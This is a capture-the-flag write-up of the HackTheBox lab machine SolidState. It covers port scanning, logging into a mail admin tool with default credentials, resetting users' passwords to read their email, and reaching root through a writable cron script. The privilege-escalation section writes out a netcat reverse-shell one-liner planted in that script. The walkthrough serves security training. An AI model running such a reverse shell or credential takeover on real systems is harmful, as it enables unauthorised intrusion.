---
title: "Solidstate"
date: 2023-08-15T19:04:20+02:00
tags: ["privesc","web","linux","ssh"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: SolidState
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Solidstate

![Untitled](/HTB/solidstate-icon.png)

## Tools Used

- nmap
- gobuster
- moniProc.sh

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
   6   │ PORT     STATE SERVICE REASON         VERSION
   7   │ 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
   8   │ | ssh-hostkey:
   9   │ |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
  10   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1
       │ SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
  11   │ |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
  12   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
  13   │ |   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
  14   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
  15   │ 25/tcp   open  smtp    syn-ack ttl 63 JAMES smtpd 2.3.2
  16   │ |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.5 [10.10.14.5])
  17   │ 80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
  18   │ |_http-title: Home - Solid State Security
  19   │ | http-methods:
  20   │ |_  Supported Methods: HEAD GET POST OPTIONS
  21   │ |_http-server-header: Apache/2.4.25 (Debian)
  22   │ 110/tcp  open  pop3    syn-ack ttl 63 JAMES pop3d 2.3.2
  23   │ 119/tcp  open  nntp    syn-ack ttl 63 JAMES nntpd (posting ok)
  24   │ 4555/tcp open  rsip?   syn-ack ttl 63
  25   │ | fingerprint-strings:
  26   │ |   GenericLines:
  27   │ |     JAMES Remote Administration Tool 2.3.2
  28   │ |     Please enter your login and password
  29   │ |     Login id:
  30   │ |     Password:
  31   │ |     Login failed for
  32   │ |_    Login id:
  33   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  34   │ SF-Port4555-TCP:V=7.94%I=7%D=8/10%Time=64D40DF2%P=arm-apple-darwin22.4.0%r
  35   │ SF:(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\
  36   │ SF:nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPas
  37   │ SF:sword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
  38   │ Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In this machine we have 6 open ports, one for **ssh** service, two for email services (**smtp** and **pop3**), a **nntp** port which is a protocol used for distributing, reading, and posting Usenet newsgroups and a **rsip?** port which is a networking protocol primarily designed for Network Address Translation (NAT) traversal.

We can observe what is shown when we try to connect on port 4555, look like a Administration Tool and has the same version as the email services so maybe is managing the mail services.

## Enumeration

First as always let’s start with the website.

![Untitled](/HTB/solidstate-1.png)

Once inside we can find a homepage and a menu which displays two more pages

![Untitled](/HTB/solidstate-2.png)

Navigating the website and hovering the redirect urls we don’t find any other interesting page or relevant info. Let’s fuzz the page with **gobuster.**

```bash
gobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz | tee fuzz.save
```

```bash
   1   │ ===============================================================
   2   │ Gobuster v3.5
   3   │ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   4   │ ===============================================================
   5   │ [+] Url:                     http://10.10.10.51/
   6   │ [+] Method:                  GET
   7   │ [+] Threads:                 10
   8   │ [+] Wordlist:                /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt
   9   │ [+] Negative Status codes:   404
  10   │ [+] User Agent:              gobuster/3.5
  11   │ [+] Extensions:              cgi,css,sh,html,js,txt,php,py
  12   │ [+] Add Slash:               true
  13   │ [+] Timeout:                 10s
  14   │ ===============================================================
  15   │ 2023/08/10 14:30:41 Starting gobuster in directory enumeration mode
  16   │ ===============================================================
  17   │ /.html/               (Status: 403) [Size: 292]
  18   │ /.hta.py/             (Status: 403) [Size: 294]
  19   │ /.hta/                (Status: 403) [Size: 291]
  20   │ /.hta.cgi/            (Status: 403) [Size: 295]
  21   │ /.hta.css/            (Status: 403) [Size: 295]
  22   │ /.hta.sh/             (Status: 403) [Size: 294]
  23   │ /.hta.html/           (Status: 403) [Size: 296]
  24   │ /.hta.php/            (Status: 403) [Size: 295]
  25   │ /.hta.txt/            (Status: 403) [Size: 295]
  26   │ /.hta.js/             (Status: 403) [Size: 294]
  27   │ /.htaccess.txt/       (Status: 403) [Size: 300]
  28   │ /.htaccess/           (Status: 403) [Size: 296]
  29   │ /.htaccess.js/        (Status: 403) [Size: 299]
  30   │ /.htaccess.css/       (Status: 403) [Size: 300]
  31   │ /.htaccess.php/       (Status: 403) [Size: 300]
  32   │ /.htaccess.py/        (Status: 403) [Size: 299]
  33   │ /.htaccess.cgi/       (Status: 403) [Size: 300]
  34   │ /.htaccess.sh/        (Status: 403) [Size: 299]
  35   │ /.htpasswd/           (Status: 403) [Size: 296]
  36   │ /.htaccess.html/      (Status: 403) [Size: 301]
  37   │ /.htpasswd.txt/       (Status: 403) [Size: 300]
  38   │ /.htpasswd.php/       (Status: 403) [Size: 300]
  39   │ /.htpasswd.py/        (Status: 403) [Size: 299]
  40   │ /.htpasswd.css/       (Status: 403) [Size: 300]
  41   │ /.htpasswd.cgi/       (Status: 403) [Size: 300]
  42   │ /.htpasswd.html/      (Status: 403) [Size: 301]
  43   │ /.htpasswd.sh/        (Status: 403) [Size: 299]
  44   │ /.htpasswd.js/        (Status: 403) [Size: 299]
  45   │ /assets/              (Status: 200) [Size: 1496]
  46   │ /icons/               (Status: 403) [Size: 292]
  47   │ /images/              (Status: 200) [Size: 2516]
  48   │ /server-status/       (Status: 403) [Size: 300]
  49   │
  50   │ ===============================================================
  51   │ 2023/08/10 14:42:35 Finished
  52   │ ===============================================================
```

At this point I’ll move on from HTTP

Let’s move to the rsip? port which seems a Admin Tool.

```bash
nc -nv $IP 4555
```

By accessing we need to provide an user and password in order to use the tool. Trying the default/common creds, I got access with root/root.

Once in we can display all the commands which we can use with HELP.

![Untitled](/HTB/solidstate-3.png)

Two are really relevant, the listusers which display the existent users and setpassword which set a user’s password.

Listing the user’s we have the next output

![Untitled](/HTB/solidstate-4.png)

We have mail users now let’s set a user password for each user and set a new password for each one.

![Untitled](/HTB/solidstate-5.png)

Now let’s see the receiving emails by connecting with POP3 for each user in order to see any kind of relevant info. I used telnet to connect because has worked better for me.

![Untitled](/HTB/solidstate-6.png)

![Untitled](/HTB/solidstate-7.png)

james and thomas don’t have emails

![Untitled](/HTB/solidstate-8.png)

john has one let’s see what we found in it.

![Untitled](/HTB/solidstate-9.png)

The mailadmin is writing john to send a mail with a credentials to mindy.

![Untitled](/HTB/solidstate-10.png)

In the mindy’s inbox we found two emails.  Let’s see if we find the credentials.

![Untitled](/HTB/solidstate-11.png)

In the first email, Mindy is welcomed to the cyber team.

![Untitled](/HTB/solidstate-12.png)

## Gaining an Initial Foothold

We have the ssh credentials of mindy let’s access to the machine as mindy.

![Untitled](/HTB/solidstate-13.png)

Let’s cat the **user’s flag.**

![Untitled](/HTB/solidstate-14.png)

## Escalating Privilege

We can observe that we have a restricted bash, which has a limited $PATH which doesn’t let us use all the commands. A easy form to change that is exporting a new PATH but the PATH doesn’t seem to be writable. 

![Untitled](/HTB/solidstate-15.png)

We can also force ssh to execute a command like bash, putting it as a argument starts the ssh session in a normal bash. We have a dumb shell, we need to treat the shell to move to a fully interactive one (I explained how to do it in a bunch write ups).

![Untitled](/HTB/solidstate-16.png)

Now we need to check if we are in with the htb ip address and without a docker container.

```bash
ip a
```

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:a2:cd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:a2cd/64 scope global mngtmpaddr dynamic
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:feb9:a2cd/64 scope link
       valid_lft forever preferred_lft forever
```

We are in the machine so let’s see if there is sudo privileges to privesc.

![Untitled](/HTB/solidstate-17.png)

Nothing relevant so let’s move to the use of moniProc.sh (the script which I have used in the [Cronos](https://pwndside.github.io/posts/cronos-htb) machine) in order to see scheduled jobs or cronjobs running at foreground. 

```bash
> /usr/sbin/CRON -f
> /bin/sh -c python /opt/tmp.py
> python /opt/tmp.py
< /usr/sbin/CRON -f
< /bin/sh -c python /opt/tmp.py
< python /opt/tmp.py
```

There is a cronjob running a script located at /opt/tmp.py.

![Untitled](/HTB/solidstate-18.png)

Is created by root and others can edit the file, so If the cronjob is being executed by the root user we are able to execute whatever we want as root.

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

The content of tmp.py is pretty convenient for us, we only need to change the command that is executing the program.

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4444 >/tmp/f'
except:
     sys.exit()
```

I put a reverse shell with nc and set a nc listener.

```bash
nc -lv 4444
```

We are root now.

![Untitled](/HTB/solidstate-19.png)

**Thank you for reading, and happy hacking! 😄**
